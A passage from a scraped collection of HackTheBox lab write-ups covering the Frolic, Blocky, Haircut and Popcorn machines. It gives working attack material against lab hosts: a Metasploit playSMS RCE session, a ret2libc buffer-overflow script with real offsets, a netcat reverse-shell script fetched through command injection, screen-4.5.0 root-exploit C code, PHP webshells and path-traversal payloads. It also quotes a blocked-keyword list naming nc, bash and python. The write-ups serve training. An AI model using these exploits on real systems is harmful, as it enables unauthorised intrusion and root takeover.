https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell # Payload {{`php /tmp/shell.php`}} www-data shell obtained Demo - Unauthenticated playSMS Template Injection RCE TCP/9999 (HTTP) - Unauthenticated playSMS Template Injection + RCE (Metasploit) This exploit came out much later (2020-02-05), and it works unauthenticated. Set OPTIONS msf6 exploit(multi/http/playsms_template_injection) &amp;gt; set RHOSTS frolic.htb RHOSTS =&amp;gt; frolic.htb msf6 exploit(multi/http/playsms_template_injection) &amp;gt; set RPORT 9999 RPORT =&amp;gt; 9999 msf6 exploit(multi/http/playsms_template_injection) &amp;gt; set TARGETURI /playsms TARGETURI =&amp;gt; /playsms msf6 exploit(multi/http/playsms_template_injection) &amp;gt; set payload payload/php/meterpreter/reverse_tcp payload =&amp;gt; php/meterpreter/reverse_tcp msf6 exploit(multi/http/playsms_template_injection) &amp;gt; set LHOST tun0 LHOST =&amp;gt; tun0 msf6 exploit(multi/http/playsms_template_injection) &amp;gt; View OPTIONS msf6 exploit(multi/http/playsms_template_injection) &amp;gt; show options Module options (exploit/multi/http/playsms_template_injection): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS frolic.htb yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS Before 1.4.3 Exploit! msf6 exploit(multi/http/playsms_template_injection) &amp;gt; exploit [*] Started reverse TCP handler on 10.10.14.14:4444 [+] Payload successfully sent [*] Sending stage (39282 bytes) to 10.10.10.111 [*] Meterpreter session 10 opened (10.10.14.14:4444 -&amp;gt; 10.10.10.111:38344 ) at 2022-09-21 04:00:25 +0800 meterpreter &amp;gt; shell Process 3464 created. Channel 0 created. id;whoami uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data Privilege EscalationRoot - Enumeration Search for files w/ SUID bit set www-data@frolic:/$ find / -perm /4000 -type f -exec ls -lda {} \\; 2&amp;gt;/dev/null -rwsr-xr-x 1 root root 38660 Mar 6 2017 /sbin/mount.cifs -rwsr-xr-x 1 root root 34812 Dec 1 2017 /bin/mount -rwsr-xr-x 1 root root 43316 May 8 2014 /bin/ping6 -rwsr-xr-x 1 root root 30112 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 38932 May 8 2014 /bin/ping -rwsr-xr-x 1 root root 26492 Dec 1 2017 /bin/umount -rwsr-xr-x 1 root root 38900 May 17 2017 /bin/su -rwsr-xr-x 1 root root 157424 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 7480 Sep 25 2018 /home/ayush/.binary/rop /home/ayush/.binary/rop Determine the file type of rop www-data@frolic:/$ file /home/ayush/.binary/rop /home/ayush/.binary/rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped Execute rop to see what it does www-data@frolic:/$ /home/ayush/.binary/rop testing123 [+] Message sent: testing123www-data@frolic:/$ Most likely a buffer overflow exploit Root - BOF Identify security properties built into rop ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot] └─# checksec rop [*] &#39;/root/htb/frolic/10.10.10.111/loot/rop&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space 0 NX - Enabled ASLR - Disabled This BOF is basically HackTheBox - Node (Read my writeup :D) but ASLR is disabled, so its easier as there is no need to bruteforce the memory. Return to libc attack bruteforce An attacker overflows a buffer on the process stack with NOP sleds and a payload to overwrite the return address (at the end of a function) in such a way that the pointed-to address is somewhere in the NOP sled. The CPU will then slide to the payload and execute it. - Source Overwrite the return address to an address that points to system(&quot;/bin/bash&quot;) Use binaryninja to examine rop to determine the vulnerable function After importing the rop, select main function Basically, the program is accepting an argument, if an argument is given, JMP to the box containing vuln function, which will print out the argument If no argument is given, prints the usage Inside the vuln function contains a vulnerability due to the usage of strcpy 0x38 is freed from the stack, 0x8 is freed from the stack 64 bytes is freed from the stack If we give an argument greater than 64bytes it will cause a buffer overflow strcnpy should be used instead Buffer Overflow Create pattern ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot] └─# msf-pattern_create -l 70 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A Determine Pattern Address Address: 0x62413762 Determine EIP offset ┌──(root💀kali)-[~/htb/frolic] └─# msf-pattern_offset -q 0x62413762 [*] Exact match at offset 52 EIP offset: 52 Ensure EIP offset is correct gdb-peda$ run $(python -c &#39;print &quot;A&quot; * 52 + &quot;B&quot; * 4 + &quot;C&quot; * 200&#39;) We good 👌 Use this ret2libc.py code from HackTheBox - Node #!/usr/bin/env python import struct from subprocess import call libc_base_addr = system_off = exit_off = arg_off = system_addr = struct.pack(&quot;&amp;lt;I&quot;, libc_base_addr+system_off) exit_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+exit_off) arg_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+arg_off) buf = &quot;A&quot; * &amp;lt;EIP OFFSET&amp;gt; buf += system_addr buf += exit_addr buf += arg_addr ret = call([&quot;BINARY&quot;, buf]) Obtain lib_base_addr www-data@frolic:~/html$ ldd /home/ayush/.binary/rop | grep libc.so.6 libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) www-data@frolic:~/html$ ldd /home/ayush/.binary/rop | grep libc.so.6 libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) You can see that the address remains the same, this is because ASLR is disabled lib_base_addr = 0xb7e19000 Obtain system_off www-data@frolic:~/html$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 www-data@frolic:~/html$ system_off = 0x0003ada0 Obtain exit_off www-data@frolic:~/html$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &#39; exit@@&#39; 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 www-data@frolic:~/html$ exit_off = 0x0002e9d0 Obtain arg_off - where /bin/sh is www-data@frolic:~/html$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep bin/sh 15ba0b /bin/sh arg_off = 0x15ba0b Final ret2libc.py script #!/usr/bin/env pythonimport structfrom subprocess import call libc_base_addr = 0xb7e19000system_off = 0x0003ada0exit_off = 0x0002e9d0 arg_off = 0x0015ba0b system_addr = struct.pack(&quot;&amp;lt;I&quot;, libc_base_addr+system_off)exit_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+exit_off)arg_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+arg_off) buf = &quot;A&quot; * 52buf += system_addrbuf += exit_addrbuf += arg_addr ret = call([&quot;/home/ayush/.binary/rop&quot;, buf]) Run ret2libc.py www-data@frolic:/tmp$ python exploit.py # id;whoamiuid=0(root) gid=33(www-data) groups=33(www-data)root# Demo - BOF " }, { "title": "HackTheBox - Blocky", "url": "/posts/Blocky/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "tcp/80-http/cms/wordpress", "date": "2022-09-20 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering a directory /plugins and wordpress CMS running on it. After enumerating wordpress, user notch is discovered. The /plugins directory contains 2 java archives. After extracting it, a compiled java file is found, simply decompiling it reveals SSH password for user notch.For the privilege escalation part, user notch is able to run any command as root, running su privilege escalated us to root. Column Details Box Name Blocky IP 10.10.10.37 Points 20 Difficulty Easy Creator Arrexel Release Date 21 Jul 2017 ReconTCP/80 (HTTP) FFUF .htaccess [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 3695ms] index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 70ms] javascript [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms] phpmyadmin [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms] plugins [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 35ms] server-status [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 37ms] wiki [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 37ms] wp-admin [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms] wp-includes [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 36ms] wp-content [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 37ms] xmlrpc.php [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 158ms] plugins phpmyadmin Initial FootholdTCP/80 (HTTP) - Enumerate WP Enumerate users ┌──(root💀kali)-[~/htb/blocky] └─# wpscan --no-update --disable-tls-checks --url http://blocky.htb -e u -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;tcp_80_http_wpscan_user_enum.txt&quot; [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) notch Enumerate plugins ┌──(root💀kali)-[~/htb/blocky] └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://blocky.htb -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;tcp_80_http_wpscan_plugin_enum.txt&quot; [i] Plugin(s) Identified: [+] akismet | Location: http://blocky.htb/wp-content/plugins/akismet/ | Last Updated: 2021-10-01T18:28:00.000Z | Readme: http://blocky.htb/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 4.2.1 | | Found By: Known Locations (Aggressive Detection) | - http://blocky.htb/wp-content/plugins/akismet/, status: 200 | | Version: 3.3.2 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://blocky.htb/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://blocky.htb/wp-content/plugins/akismet/readme.txt Does not look vulnerable, move onTCP/80 (HTTP) - What kind of files are in /plugins directory Download all files residing in plugins Determine the file type of downloaded files ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot] └─# file BlockyCore.jar griefprevention-1.11.2-3.1.1.298.jar BlockyCore.jar: Java archive data (JAR) griefprevention-1.11.2-3.1.1.298.jar: Zip archive data, at least v2.0 to extract, compression method=deflate Extract BlockyCore.jar ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot/blockycore] └─# jar -xf BlockyCore.jar Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true View directory structure of the extract files ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot/blockycore] └─# tree -a . . ├── BlockyCore.jar ├── com │   └── myfirstplugin │   └── BlockyCore.class └── META-INF └── MANIFEST.MF 3 directories, 3 files BlockyCore.jar Determine the file type of Blocky.jore ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot/blockycore/com/myfirstplugin] └─# file BlockyCore.class BlockyCore.class: compiled Java class data, version 52.0 (Java 1.8) A Java class file is created by a Java compiler from .java files TCP/80 (HTTP) - Decompile .class file, obtaining credentials Decompile BlockyCore.class file ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot/blockycore/com/myfirstplugin] └─# javap -c BlockyCore.class | tee decompiled_BlockyCore.class View decompiled_BlockyCore.class, credentials found in the comments ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot/blockycore/com/myfirstplugin] └─# cat decompiled_BlockyCore.class | grep -P &#39;//&#39; 1: invokespecial #12 // Method java/lang/Object.&quot;&amp;lt;init&amp;gt;&quot;:()V 5: ldc #14 // String localhost 7: putfield #16 // Field sqlHost:Ljava/lang/String; 11: ldc #18 // String root 13: putfield #20 // Field sqlUser:Ljava/lang/String; 17: ldc #22 // String 8YsqfCTnvxAUeduzjNSXe22 19: putfield #24 // Field sqlPass:Ljava/lang/String; 1: ldc #33 // String TODO get username 3: ldc #35 // String Welcome to the BlockyCraft!!!!!!! 5: invokevirtual #37 // Method sendMessage:(Ljava/lang/String;Ljava/lang/String;)V 8YsqfCTnvxAUeduzjNSXe22 TCP/22 (SSH) SSH w/ notch:8YsqfCTnvxAUeduzjNSXe22 ┌──(root💀kali)-[~/htb/blocky/10.10.10.37/loot/blockycore/com/myfirstplugin] └─# sshpass -p &#39;8YsqfCTnvxAUeduzjNSXe22&#39; ssh notch@blocky.htb Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 7 packages can be updated. 7 updates are security updates. Last login: Tue Sep 20 06:14:32 2022 from 10.10.14.14 notch@Blocky:~$ id;whoami uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) notch notch@Blocky:~$ Privilege EscalationRoot - Sudo Check notch sudo access notch@Blocky:~$ sudo -l [sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User notch may run the following commands on Blocky: (ALL : ALL) ALL Able to run any command as root Obtain root w/ su notch@Blocky:~$ sudo su root@Blocky:/home/notch# id;whoami uid=0(root) gid=0(root) groups=0(root) root root@Blocky:/home/notch# " }, { "title": "HackTheBox - Haircut", "url": "/posts/Haircut/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/command-injection", "date": "2022-09-19 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering exposed.php, a webpage that allows users to curl any webpages and display it. However, due to the insufficient input sanitization, it is susceptible to command injection, allowing us to download a reverse shell onto the popcorn.htb and executing it, obtaining a low-privilege/www-data user.For the privilege escalation part, after enumerating the system, there is a binary screen-4.5.0 that has setuid bit on it, it is susceptible to a local privilege escalation exploit, screen-4.5.0 is able to create ld.so.preload, where its content points to a malicious library, allowing us to privilege escalate to root when executing screen-4.5.0. Column Details Box Name Haircut IP 10.10.10.24 Points 30 Difficulty Medium Creator r00tkie Release Date 26 May 2017 ReconTCP/80 (HTTP)200 GET 286l 1220w 116637c http://10.10.10.24/bounce.jpg200 GET 7l 15w 144c http://10.10.10.24/200 GET 7l 15w 144c http://10.10.10.24/index.html200 GET 646l 3555w 167677c http://10.10.10.24/carrie.jpg200 GET 6l 15w 223c http://10.10.10.24/test.html301 GET 7l 13w 194c http://10.10.10.24/uploads =&amp;gt; http://10.10.10.24/uploads/200 GET 459l 2660w 135186c http://10.10.10.24/sea.jpg200 GET 7l 15w 141c http://10.10.10.24/hair.html200 GET 19l 41w 0c http://10.10.10.24/exposed.php exposed.php uploadsInitial FootholdTCP/80 (HTTP) - Command Injection haircut.htb/exposed.htb is susceptible to command injection due to insufficent input sanitization mechanisms. # Payload `id` # Banned Characters bash ; | ! Source code should look something like this $POST=$_POST[&#39;formurl&#39;] shell_exec(&quot;curl&quot; . $POST) Start netcat listener ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# nc -nvlp 80 &amp;gt; exposed.php Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 View source code of exposed.php w/ -T curl option ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# curl --help | grep &quot;\\-T&quot; -T, --upload-file &amp;lt;file&amp;gt; Transfer local FILE to destination # Payload formurl=-T exposed.php http://10.10.14.14/&amp;amp;submit=Go ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# nc -nvlp 80 &amp;gt; exposed.php Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.10.24. Ncat: Connection from 10.10.10.24:53216. ^C View exposed.php &amp;lt;?php if(isset($_POST[&#39;formurl&#39;])){ echo &quot;&amp;lt;p&amp;gt;Requesting Site...&amp;lt;/p&amp;gt;&quot;; $userurl=$_POST[&#39;formurl&#39;]; $naughtyurl=0; $disallowed=array(&#39;%&#39;,&#39;!&#39;,&#39;|&#39;,&#39;;&#39;,&#39;python&#39;,&#39;nc&#39;,&#39;perl&#39;,&#39;bash&#39;,&#39;&amp;amp;&#39;,&#39;#&#39;,&#39;{&#39;,&#39;}&#39;,&#39;[&#39;,&#39;]&#39;); foreach($disallowed as $naughty){ if(strpos($userurl,$naughty) !==false){ echo $naughty.&#39; is not a good thing to put in a URL&#39;; $naughtyurl=1; } } if($naughtyurl==0){ echo shell_exec(&quot;curl &quot;.$userurl.&quot; 2&amp;gt;&amp;amp;1&quot;); } } ?&amp;gt; Due to insufficient input sanitization, command injection and RCE is possible Create reverse shell payload ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# cat exploit.sh #!/bin/bash nc 10.10.14.14 4444 -e /bin/bash Start python webserver ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Download it on haircut.htb w/ -o curl option ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# curl --help | grep &quot;\\-o&quot; -o, --output &amp;lt;file&amp;gt; Write to file instead of stdout # Payload formurl=-o /tmp/exploit.sh http://10.10.14.14/exploit.sh&amp;amp;submit=Go Start netcat listener ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/loot] └─# nc -nvlp 80 &amp;gt; exposed.php Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke reverse shell # Payloadformurl=`sh /tmp/exploit.sh`&amp;amp;submit=Go Privilege EscalationRoot - Enumeration Search for files w/ SUID bit set www-data@haircut:~/html$ find / -perm /4000 -type f -exec ls -lda {} \\; 2&amp;gt;/dev/null -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40128 May 4 2017 /bin/su -rwsr-xr-x 1 root root 40152 Dec 16 2016 /bin/mount -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 27608 Dec 16 2016 /bin/umount -rwsr-xr-x 1 root root 136808 Jan 20 2017 /usr/bin/sudo -rwsr-xr-x 1 root root 23376 Jan 18 2016 /usr/bin/pkexec -rwsr-xr-x 1 root root 32944 May 4 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 39904 May 4 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 32944 May 4 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 75304 May 4 2017 /usr/bin/gpasswd -rwsr-sr-x 1 daemon daemon 51464 Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 54256 May 4 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 1588648 May 19 2017 /usr/bin/screen-4.5.0 -rwsr-xr-x 1 root root 40432 May 4 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 49584 May 4 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 38984 Mar 7 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 208680 Apr 29 2017 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 428240 Mar 16 2017 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14864 Jan 18 2016 /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/screen-4.5.0 - quite a popular exploit on vulnerable machines Check screen version www-data@haircut:~/html$ screen -v Screen version 4.05.00 (GNU) 10-Dec-16 Root - Exploit Screen 4.5.0 What is ld.so.preload? In Linux, we are able to specify libraries to preload in LD_PRELOAD environment variable or /etc/ld.so.preload file. When binaries on the system are executed, /etc/ld.so.preload file will be executed/loaded. We can prove it by using strace on any binary www-data@haircut:~/html$ strace /usr/bin/screen-4.5.0 execve(&quot;/usr/bin/screen-4.5.0&quot;, [&quot;/usr/bin/screen-4.5.0&quot;], [/* 6 vars */]) 0 (NULL) = 0x768000 fcntl(0, F_GETFD) = 0 fcntl(1, F_GETFD) = 0 fcntl(2, F_GETFD) = 0 access(&quot;/etc/suid-debug&quot;, F_OK) = -1 ENOENT (No such file or directory) access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or ) mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7871b75000 access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory) open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=24939, ...}) = 0 mmap(NULL, 24939, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7871b6e000 close(3) = 0 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory) How do we exploit screen-4.5.0 screen-4.5.0 creates a logfile w/ full root privileges, this allows users to truncate any file or create a root-owned file in any directory. This exploit will allows us to create /etc/ld.so.preload file and populate its content with a malicious library(ies). We can do so by naming screen-4.5.0’s log file ld.so.preload and echo the path of the malicious library so that it will be stored in the logfile. Finally, execute screen-4.5.0, and the malicious library will be loaded/executed. Create files needed for screen-4.5.0 exploit rootshell To spawn a shell w/ root privileges libhax.so Malicious library that will setuid on rootshell Create rootshell.c on kali #include &amp;lt;stdio.h&amp;gt; int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL); } Create libhax.c on kali #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; __attribute__ ((__constructor__)) void dropshell(void){ chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!\\n&quot;); } Compile libhax.c &amp;amp; rootshell.c ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/exploit/screen-4.5.0] └─# gcc -fPIC -shared -ldl -o libhax.so libhax.c ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/exploit/screen-4.5.0] └─# gcc -o /tmp/rootshell /tmp/rootshell.c Zip it &amp;amp; Transfer to haircut.htb ┌──(root💀kali)-[~/htb/haircut/10.10.10.24/exploit/screen-4.5.0] └─# tar czf exploit.gz libhax.so rootshell www-data@haircut:/tmp$ wget 10.10.14.14/exploit.gz exploit.gz 100%[========] 4.28K --.-KB/s in 0.006s 2022-09-19 14:53:22 (737 KB/s) - &#39;exploit.gz&#39; saved [4381/4381] www-data@haircut:/tmp$ Extract exploit.gz www-data@haircut:/tmp$ tar -zxf exploit.gz Exploit screen-4.5.0 Proceed to /etc Set umask www-data@haircut:/etc$ umask 000 Create ld.so.preload w/ screen www-data@haircut:/etc$ ls -la ld.so.preload ls: cannot access &#39;ld.so.preload&#39;: No such file or directory # echo the path of our malicious library to the log file ld.so.preload www-data@haircut:/etc$ /usr/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne &quot;\\x0a/tmp/libhax.so&quot; -rw-rw-rw- 1 root www-data 16 Sep 19 17:33 ld.so.preload Trigger the payload www-data@haircut:/etc$ /usr/bin/screen-4.5.0 -ls No Sockets found in /tmp/screens/S-www-data. www-data@haircut:/etc$ /tmp/rootshell Obtained root shell www-data@haircut:/etc$ /tmp/rootshell # id;whoami uid=0(root) gid=0(root) groups=0(root),33(www-data) root # " }, { "title": "HackTheBox - Popcorn", "url": "/posts/Popcorn/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/kernel-exploit, exploit/file-upload-bypass", "date": "2022-09-18 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ web enumeration, discovering a .php file that allows user to rename files. There is a lack of input sanitization, allowing users to rename any file on the entire system by using directory traversal (../), similar to LFI.There is a web application that allows user to upload and host torrent files. It is not possible to bypass this restriction, however there is another vulnerable function on the web application, users are allowed to add screenshot of the torrent file, and users are able to bypass the restriction, and upload .php files.With the help of the rename page, we are able to find out the location of our reverse shell, rename it to .php and move it to the web root diretory, allowing us to obtain a low-privilege/www-data user.For the privilege escalation part, the system is susceptible to a kernel exploit called dirtyc0w, simply running the exploit will root the machine. Also, the machine is susceptible to to a local privilege escalation exploit because of an outdated version of pam, simply running the exploit will root the machine. Column Details Box Name Popcorn IP 10.10.10.6 Points 30 Difficulty Medium Creator ch4p Release Date 15 Mar 2017 ReconTCP/80 (HTTP) FFUF cgi-bin/ [Status: 403, Size: 287, Words: 21, Lines: 11] index [Status: 200, Size: 177, Words: 22, Lines: 5] index.html [Status: 200, Size: 177, Words: 22, Lines: 5] test [Status: 200, Size: 47137, Words: 2474, Lines: 651] torrent [Status: 301, Size: 312, Words: 20, Lines: 10] rename [Status: 301, Size: 309, Words: 20, Lines: 10] rename torrent Initial FootholdTCP/80 (HTTP) - What is rename/index.php doing? Proceed to rename/index.php, it is a page that allows users to rename a specified file. It could be vulnerable to directory traversal (../), allowing us to move a potentially sensitive file into the web directory for us to view. Rename rename/index.php -&amp;gt; rename/rename.php as a test # Payload filename=/var/www/html/index.php&amp;amp;newfilename=/var/www/html/rename.php If the file does not exist, PHP will disclose the full path of the php script that was executed. Web Root Directory: /var/www/ Attempt directory traversal (../) to rename rename/index.php to see if there are any input sanitization mechanism in place. # Payload filename=../../../../../../../../var/www/rename/index.php&amp;amp;newfilename=../../../../../../../../var/www/rename/rename.php Directory traversal works! Attempt to view users on the machine by renaming /etc/passwd into the web directory. # Payload filename=../../../../../../../../etc/passwd&amp;amp;newfilename=../../../../../../../../var/www/passwd Permission denied To proceed, we have a few options LFI2RCE Upload a webshell w/ torrenthost and move webshell into a place where we can execute it. (/var/www/shell.php) TCP/80 (HTTP) - LFI2RCE (Failed) Include apache log file Validate the location of apache log files # Payload filename=../../../../../../../../var/log/apache2/access.log&amp;amp;newfilename=../../../../../../../../var/log/apache2/access.log Permission denied Include /proc/self/environ Validate the location of /proc/self/environ, it exists # Payload filename=../../../../../../../../proc/self/environ&amp;amp;newfilename=../../../../../../../../proc/self/environ Poison /proc/self/environ/, and attempt to move it to /var/www/, failed # Payload filename=../../../../../../../../proc/self/environ&amp;amp;newfilename=../../../../../../../../var/www/environ # User Agent &amp;lt;?php system(\\$_GET[&#39;c&#39;]); ?&amp;gt; failed to open stream Include SSH log files Validate the location of /var/log/auth.log, it exists filename=../../../../../../../../var/log/auth.log&amp;amp;newfilename=../../../../../../../../var/log/auth.log Poison SSH Log ┌──(root💀kali)-[~/htb/popcorn/10.10.10.6/exploit/test] └─# ssh &#39;&amp;lt;?php echo system($_GET[&quot;c&quot;]); exit; ?&amp;gt;&#39;@popcorn.htb &amp;lt;?php echo system($_GET[&quot;c&quot;]); exit; ?&amp;gt;@popcorn.htb&#39;s password: Attempt to move it to /var/www/, failed filename=../../../../../../../../var/log/auth.log&amp;amp;newfilename=../../../../../../../../var/www/auth.php TCP/80 (HTTP) - Upload webshell.torrent on Torrent Host Register an account for torrenthost After some testing, torrenthost is able to tell if a file that already exists in their database is being uploaded by analyzing the contents of the uploaded file (I think). Thus, changing the filename does not bypass it. Changing the content of the torrent file even by a single character causes the file to be recognised as not a torrent file. So trying to insert a webshell into the contents of a torrent file w/ burp will not work. Create our own webshell torrent file to upload Create webshell.torrent ┌──(root💀kali)-[~/htb/popcorn/10.10.10.6/loot] └─# cat webshell.php &amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt; ┌──(root💀kali)-[~/htb/popcorn/10.10.10.6/loot] └─# transmission-create webshell.php -o webshell.torrent WARNING: no trackers specified Creating torrent &quot;webshell.torrent&quot; .... done! Add a webshell into the Optional Name field Upload it, success! Next, we have to find out where is webshell.torrent stored. Simply rename popcorn.htb/torrent/index.php to popcorn.htb/torrent/index, so that we are able to view the directory listing of mirai.htb/torrent, this will allow us to browse the entire /torrent directory to find out where webshell.torrent is stored. # Payload filename=../../../../../../../../var/www/torrent/index.php&amp;amp;newfilename=../../../../../../../../var/www/torrent/index torrents/ - webshell.torrent could be residing it in Do what we did earlier, rename popcorn.htb/torrent/torrents/index.php to view the directory listing of popcorn.htb/torrent/torrents/ Found our webshell.torrent Move it to /var/www/ # Payload 